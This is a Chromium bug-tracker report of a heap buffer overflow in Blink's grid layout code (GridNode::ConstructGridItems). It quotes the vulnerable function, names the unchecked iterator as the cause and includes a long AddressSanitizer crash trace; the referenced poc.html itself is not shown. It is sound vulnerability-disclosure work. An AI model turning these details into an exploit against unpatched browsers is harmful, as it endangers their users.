# HeapBufferOverflow in GridNode::ConstructGridItems

| Field | Value |
|-------|-------|
| **Issue ID** | [339686368](https://issues.chromium.org/issues/339686368) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>Layout>Grid |
| **Platforms** | Linux |
| **Chrome Version** | 126.0.6452.3 |
| **Reporter** | su...@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2024-05-10 |
| **Bounty** | $8,000.00 |

## Description

# Steps to reproduce the problem

1. Serve poc.html on port 8080
2. Launch chrome and then access <http://127.0.0.1:8080/poc.html>

# Problem Description

```
GridItems GridNode::ConstructGridItems(
    const GridLineResolver& line_resolver,
    const ComputedStyle& root_grid_style,
    const ComputedStyle& parent_grid_style,
    bool must_consider_grid_items_for_column_sizing,
    bool must_consider_grid_items_for_row_sizing,
    bool* must_invalidate_placement_cache,
    HeapVector<Member<LayoutBox>>* opt_oof_children,
    bool* opt_has_nested_subgrid) const {
  DCHECK(must_invalidate_placement_cache);

  if (opt_has_nested_subgrid) {
    *opt_has_nested_subgrid = false;
  }

  GridItems grid_items;
  auto* layout_grid = To<LayoutGrid>(box_.Get());
  const GridPlacementData* cached_placement_data = nullptr;

  if (layout_grid->HasCachedPlacementData()) {
    cached_placement_data = &layout_grid->CachedPlacementData();

    // Even if the cached placement data is incorrect, as long as the grid is
    // not marked as dirty, the grid item count should be the same.
    grid_items.ReserveInitialCapacity(
        cached_placement_data->grid_item_positions.size());

    if (*must_invalidate_placement_cache ||
        line_resolver != cached_placement_data->line_resolver) {
      // We need to recompute grid item placement if the automatic column/row
      // repetitions changed due to updates in the container's style or if any
      // grid in the ancestor chain invalidated its subtree's placement cache.
      cached_placement_data = nullptr;
    }
  }

  // Placement cache gets invalidated when there are significant changes in this
  // grid's computed style. However, these changes might alter the placement of
  // subgridded items, so this flag is used to signal that we need to recurse
  // into subgrids to recompute their placement.
  *must_invalidate_placement_cache |= !cached_placement_data;

  {
    bool should_sort_grid_items_by_order_property = false;
    const int initial_order = ComputedStyleInitialValues::InitialOrder();

    for (auto child = FirstChild(); child; child = child.NextSibling()) {
      if (child.IsOutOfFlowPositioned()) {
        if (opt_oof_children) {
          opt_oof_children->emplace_back(child.GetLayoutBox());
        }
        continue;
      }

      auto grid_item = std::make_unique<GridItemData>(
          To<BlockNode>(child), parent_grid_style, root_grid_style,
          must_consider_grid_items_for_column_sizing,
          must_consider_grid_items_for_row_sizing);

      // We'll need to sort when we encounter a non-initial order property.
      should_sort_grid_items_by_order_property |=
          child.Style().Order() != initial_order;

      // Check whether we'll need to further append subgridded items.
      if (opt_has_nested_subgrid) {
        *opt_has_nested_subgrid |= grid_item->IsSubgrid();
      }
      grid_items.Append(std::move(grid_item));
    }

    if (should_sort_grid_items_by_order_property)
      grid_items.SortByOrderProperty();
  }

#if DCHECK_IS_ON()
  if (cached_placement_data) {
    GridPlacement grid_placement(Style(), line_resolver);
    DCHECK(*cached_placement_data ==
           grid_placement.RunAutoPlacementAlgorithm(grid_items));
  }
#endif

  if (!cached_placement_data) {
    GridPlacement grid_placement(Style(), line_resolver);
    layout_grid->SetCachedPlacementData(
        grid_placement.RunAutoPlacementAlgorithm(grid_items));
    cached_placement_data = &layout_grid->CachedPlacementData();
  }

  // Copy each resolved position to its respective grid item data.
  auto* resolved_position = cached_placement_data->grid_item_positions.begin();
  for (auto& grid_item : grid_items) {
    grid_item.resolved_position = *(resolved_position++);   <----------- [1]
  }
  return grid_items;
}

```

[1] The iterator was not checked to see if it has reached the end of the container.

# Summary

HeapBufferOverflow in GridNode::ConstructGridItems

# Custom Questions

#### Type of crash:

tab

#### Crash state:

=================================================================
==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50300008e2e8 at pc 0x560075f4c57b bp 0x7fff77509670 sp 0x7fff77508e30
READ of size 24 at 0x50300008e2e8 thread T0 (chrome)
==1==WARNING: invalid path to external symbolizer!
==1==WARNING: Failed to use and restart external symbolizer!
#0 0x560075f4c57a in \_\_asan\_memcpy *asan\_rtl*:3
#1 0x560095d78a73 in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, blink::ComputedStyle const&, blink::ComputedStyle const&, bool, bool, bool\*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_node.cc:118:33
#2 0x560095d7787c in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, bool\*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_node.cc:18:10
#3 0x560095d1fdd4 in blink::GridLayoutAlgorithm::BuildGridSizingSubtree(blink::GridSizingTree\*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, blink::SubgriddedItemData const&, blink::GridLineResolver const*, bool, bool) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_layout\_algorithm.cc:543:14
#4 0x560095d15ca5 in blink::GridLayoutAlgorithm::BuildGridSizingTree(blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_layout\_algorithm.cc:696:5
#5 0x560095d1eb0d in blink::GridLayoutAlgorithm::ComputeMinMaxSizes(blink::MinMaxSizesFloatInput const&) ./../../third\_party/blink/renderer/core/layout/grid/grid\_layout\_algorithm.cc:380:33
#6 0x560095c0048f in operator()[blink::GridLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:221:25
#7 0x560095c0048f in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::GridLayoutAlgorithm, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#8 0x560095bea596 in ComputeMinMaxSizesWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:219:3
#9 0x560095bea596 in blink::BlockNode::ComputeMinMaxSizes(blink::WritingMode, blink::MinMaxSizesType, blink::ConstraintSpace const&, blink::MinMaxSizesFloatInput) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:972:30
#10 0x560096044d2c in operator() ./../../third\_party/abseil-cpp/absl/functional/function\_ref.h:132:12
#11 0x560096044d2c in operator() ./../../base/functional/function\_ref.h:124:12
#12 0x560096044d2c in blink::ResolveInlineLengthInternal(blink::ConstraintSpace const&, blink::ComputedStyle const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, blink::Length const&, blink::Length const\*, blink::LayoutUnit, blink::LayoutUnit) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:87:11
#13 0x56009604a4a0 in ResolveMainInlineLength ./../../third\_party/blink/renderer/core/layout/length\_utils.h:131:10
#14 0x56009604a4a0 in blink::ComputeInlineSizeForFragmentInternal(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:479:14
#15 0x56009604b3a8 in blink::ComputeInlineSizeForFragment(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:507:10
#16 0x560096054cf9 in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const\*, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, bool) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:1460:22
#17 0x56009605590b in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const\*, bool) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:1501:10
#18 0x560095be056e in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:395:9
#19 0x560095bf3e92 in blink::BlockNode::LayoutAtomicInline(blink::ConstraintSpace const&, blink::ComputedStyle const&, bool, blink::BaselineAlgorithmType) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:1536:32
#20 0x560095de9e3f in blink::LineBreaker::HandleAtomicInline(blink::InlineItem const&, blink::LineInfo\*) ./../../third\_party/blink/renderer/core/layout/inline/line\_breaker.cc:3000:14
#21 0x560095de0e4f in blink::LineBreaker::BreakLine(blink::LineInfo\*) ./../../third\_party/blink/renderer/core/layout/inline/line\_breaker.cc:0:7
#22 0x560095ddcfb0 in blink::LineBreaker::NextLine(blink::LineInfo\*) ./../../third\_party/blink/renderer/core/layout/inline/line\_breaker.cc:840:3
#23 0x560095b4f075 in blink::InlineLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/inline/inline\_layout\_algorithm.cc:1129:20
#24 0x560095af0080 in blink::InlineNode::Layout(blink::ConstraintSpace const&, blink::BreakToken const\*, blink::ColumnSpannerPath const\*, blink::InlineChildLayoutContext\*) const ./../../third\_party/blink/renderer/core/layout/inline/inline\_node.cc:1658:20
#25 0x560095cf5ee8 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*, blink::LayoutInputNode\*, blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:125:25
#26 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const\*, blink::PreviousInflowPosition\*, blink::InlineChildLayoutContext\*, blink::InlineBreakToken const\*\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:1998:7
#27 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:878:18
#28 0x560095cdd71d in blink::BlockLayoutAlgorithm::LayoutWithSimpleInlineChildLayoutContext(blink::InlineNode const&) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:566:32
#29 0x560095cd789c in blink::BlockLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:499:14
#30 0x560095bf7ffa in operator()[blink::BlockLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:210:50
#31 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#32 0x560095be1143 in LayoutWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:208:3
#33 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:465:21
#34 0x560095cf5f84 in LayoutBlockChild ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:113:16
#35 0x560095cf5f84 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*, blink::LayoutInputNode\*, blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:128:10
#36 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const\*, blink::PreviousInflowPosition\*, blink::InlineChildLayoutContext\*, blink::InlineBreakToken const\*\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:1998:7
#37 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:878:18
#38 0x560095cd78ae in blink::BlockLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:501:14
#39 0x560095bf7ffa in operator()[blink::BlockLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:210:50
#40 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#41 0x560095be1143 in LayoutWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:208:3
#42 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:465:21
#43 0x560095cf5f84 in LayoutBlockChild ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:113:16
#44 0x560095cf5f84 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*, blink::LayoutInputNode\*, blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:128:10
#45 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const\*, blink::PreviousInflowPosition\*, blink::InlineChildLayoutContext\*, blink::InlineBreakToken const\*\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:1998:7
#46 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:878:18
#47 0x560095cd78ae in blink::BlockLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:501:14
#48 0x560095bf7ffa in operator()[blink::BlockLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:210:50
#49 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#50 0x560095be1143 in LayoutWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:208:3
#51 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:465:21
#52 0x560095ce9d64 in LayoutBlockChild ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:113:16
#53 0x560095ce9d64 in blink::BlockLayoutAlgorithm::LayoutNewFormattingContext(blink::LayoutInputNode, blink::BlockBreakToken const\*, blink::InflowChildData const&, blink::BfcOffset, bool, blink::BfcOffset\*, blink::BoxStrut\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:1812:41
#54 0x560095ce7334 in blink::BlockLayoutAlgorithm::HandleNewFormattingContext(blink::LayoutInputNode, blink::BlockBreakToken const\*, blink::PreviousInflowPosition\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:1604:39
#55 0x560095cd9668 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:873:18
#56 0x560095cd78ae in blink::BlockLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:501:14
#57 0x560095bf7ffa in operator()[blink::BlockLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:210:50
#58 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#59 0x560095be1143 in LayoutWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:208:3
#60 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:465:21
#61 0x560096036117 in blink::LayoutView::LayoutRoot() ./../../third\_party/blink/renderer/core/layout/layout\_view.cc:863:19
#62 0x560094e4e3de in blink::LocalFrameView::PerformLayout() ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:782:24
#63 0x560094e505c8 in blink::LocalFrameView::UpdateLayout() ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:841:3
#64 0x560094e6d0a2 in blink::LocalFrameView::UpdateStyleAndLayoutInternal() ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:3166:7
#65 0x560094e5934f in blink::LocalFrameView::UpdateStyleAndLayout() ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:3096:18
#66 0x560094e669ee in blink::LocalFrameView::UpdateStyleAndLayoutIfNeededRecursive() ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:3019:3
#67 0x560094e63fa9 in blink::LocalFrameView::RunStyleAndLayoutLifecyclePhases(blink::DocumentLifecycle::LifecycleState) ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2475:3
#68 0x560094e63330 in blink::LocalFrameView::UpdateLifecyclePhasesInternal(blink::DocumentLifecycle::LifecycleState) ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2235:9
#69 0x560094e6100a in blink::LocalFrameView::UpdateLifecyclePhases(blink::DocumentLifecycle::LifecycleState, blink::DocumentUpdateReason) ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2167:3
#70 0x560094e60779 in blink::LocalFrameView::UpdateAllLifecyclePhases(blink::DocumentUpdateReason) ./../../third\_party/blink/renderer/core/frame/local\_frame\_view.cc:1903:54
#71 0x5600966ab3ec in blink::PageAnimator::UpdateAllLifecyclePhases(blink::LocalFrame&, blink::DocumentUpdateReason) ./../../third\_party/blink/renderer/core/page/page\_animator.cc:397:9
#72 0x560094fa3e26 in blink::WebFrameWidgetImpl::UpdateLifecycle(blink::WebLifecycleUpdate, blink::DocumentUpdateReason) ./../../third\_party/blink/renderer/core/frame/web\_frame\_widget\_impl.cc:1584:14
#73 0x560097865e55 in UpdateVisualState ./../../third\_party/blink/renderer/platform/widget/widget\_base.cc:1017:12
#74 0x560097865e55 in non-virtual thunk to blink::WidgetBase::UpdateVisualState() ./../../third\_party/blink/renderer/platform/widget/widget\_base.cc:0:0
#75 0x56008cf5cdac in cc::LayerTreeHost::RequestMainFrameUpdate(bool) ./../../cc/trees/layer\_tree\_host.cc:376:12
#76 0x56008d20f822 in cc::ProxyMain::BeginMainFrame(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>) ./../../cc/trees/proxy\_main.cc:283:21
#77 0x56008d2338c9 in Invoke<void (cc::ProxyMain::*)(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), const base::WeakPtr[cc::ProxyMain](javascript:void(0);) &, std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > ./../../base/functional/bind\_internal.h:738:12
#78 0x56008d2338c9 in MakeItSo<void (cc::ProxyMain::*)(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), std::\_\_Cr::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > > ./../../base/functional/bind\_internal.h:954:5
#79 0x56008d2338c9 in void base::internal::Invoker<base::internal::FunctorTraits<void (cc::ProxyMain::*&&)(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), base::WeakPtr[cc::ProxyMain](javascript:void(0);)&&, std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>&&>, base::internal::BindState<true, true, false, void (cc::ProxyMain::*)(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>>, void ()>::RunImpl<void (cc::ProxyMain::*)(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), std::\_\_Cr::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>>, 0ul, 1ul>(void (cc::ProxyMain::*&&)(std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), std::\_\_Cr::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>>&&, std::\_\_Cr::integer\_sequence<unsigned long, 0ul, 1ul>) ./../../base/functional/bind\_internal.h:1067:14
#80 0x56008824aaa4 in Run ./../../base/functional/callback.h:156:12
#81 0x56008824aaa4 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task\_annotator.cc:203:34
#82 0x5600882ab324 in RunTask<(lambda at ../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:475:11)> ./../../base/task/common/task\_annotator.h:90:5
#83 0x5600882ab324 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:473:23
#84 0x5600882aa23d in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:338:40
#85 0x5600882ac05a in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:0:0
#86 0x56008814390d in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:40:55
#87 0x5600882accd6 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:645:12
#88 0x5600881dd35f in base::RunLoop::Run(base::Location const&) ./../../base/run\_loop.cc:134:14
#89 0x56009f692673 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer\_main.cc:368:16
#90 0x56008591d9a9 in content::RunZygote(content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:678:14
#91 0x56008591eefe in content::RunOtherNamedProcessTypeMain(std::\_\_Cr::basic\_string<char, std::\_\_Cr::char\_traits<char>, std::\_\_Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:782:12
#92 0x560085921a91 in content::ContentMainRunnerImpl::Run() ./../../content/app/content\_main\_runner\_impl.cc:1155:10
#93 0x56008591bcc0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner\*) ./../../content/app/content\_main.cc:332:36
#94 0x56008591c34b in content::ContentMain(content::ContentMainParams) ./../../content/app/content\_main.cc:345:10
#95 0x560075f87408 in ChromeMain ./../../chrome/app/chrome\_main.cc:192:12
#96 0x7f923b1b4d8f in \_\_libc\_init\_first ??:?

0x50300008e2e8 is located 0 bytes after 24-byte region [0x50300008e2d0,0x50300008e2e8)
allocated by thread T0 (chrome) here:
#0 0x560075f4e78f in \_\_interceptor\_malloc *asan\_rtl*:3
#1 0x5600884925bb in AllocInternal<(partition\_alloc::internal::AllocFlags)0> ./../../base/allocator/partition\_allocator/src/partition\_alloc/partition\_root.h:2072:51
#2 0x5600884925bb in AllocInline<(partition\_alloc::internal::AllocFlags)0> ./../../base/allocator/partition\_allocator/src/partition\_alloc/partition\_root.h:511:12
#3 0x5600884925bb in void\* partition\_alloc::PartitionRoot::Alloc<(partition\_alloc::internal::AllocFlags)0>(unsigned long, char const\*) ./../../base/allocator/partition\_allocator/src/partition\_alloc/partition\_root.h:505:12
#4 0x560095d69b88 in AllocateVectorBacking[blink::GridArea](javascript:void(0);) ./../../third\_party/blink/renderer/platform/wtf/allocator/partition\_allocator.h:40:9
#5 0x560095d69b88 in AllocateBufferNoBarrier ./../../third\_party/blink/renderer/platform/wtf/vector.h:518:9
#6 0x560095d69b88 in AllocateBuffer ./../../third\_party/blink/renderer/platform/wtf/vector.h:415:5
#7 0x560095d69b88 in ReserveInitialCapacity ./../../third\_party/blink/renderer/platform/wtf/vector.h:1940:11
#8 0x560095d69b88 in blink::GridPlacement::PlaceNonAutoGridItems(blink::GridItems const&, blink::GridPlacement::PlacedGridItemsList\*, WTF::Vector<blink::GridArea\*, 16u, WTF::PartitionAllocator>*, WTF::Vector<blink::GridArea*, 16u, WTF::PartitionAllocator>*) ./../../third\_party/blink/renderer/core/layout/grid/grid\_placement.cc:126:39
#9 0x560095d6880b in blink::GridPlacement::RunAutoPlacementAlgorithm(blink::GridItems const&) ./../../third\_party/blink/renderer/core/layout/grid/grid\_placement.cc:72:8
#10 0x560095d7894a in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, blink::ComputedStyle const&, blink::ComputedStyle const&, bool, bool, bool*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_node.cc:111:24
#11 0x560095d7787c in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, bool\*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_node.cc:18:10
